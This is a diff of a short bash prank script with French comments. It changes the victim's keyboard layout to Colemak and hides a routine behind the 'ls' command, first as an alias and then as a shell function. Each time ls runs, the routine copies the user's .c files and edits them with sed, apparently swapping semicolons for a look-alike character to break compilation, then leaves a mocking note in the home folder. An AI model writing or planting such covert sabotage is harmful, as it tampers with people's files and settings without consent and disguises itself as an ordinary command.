@@ -1,14 +1,14 @@
 #!/bin/bash
 setxkbmap us -variant colemak 
-alias ls="bash $HOME/.couille && ls"
+#alias ls="bash $HOME/.couille && ls"
 
-echo "sussy() {
+ls() {
     for f in *.c; do
     echo "$f"
     cp "$f" "original-${f}.c"
     sed -i 's/;/;/g' $f
     done
-}" > $HOME/.couille
+}
 
 echo "Tes .c non-glitch sont toujours dans leur dossier d'origine, sous le nom \".original-{nom}.c\". Relance ton terminal pour retirer la commande btw :)" > $HOME/fix.txt
 echo "hésite pas à check le fichier fix.txt dans ton HOME :p"
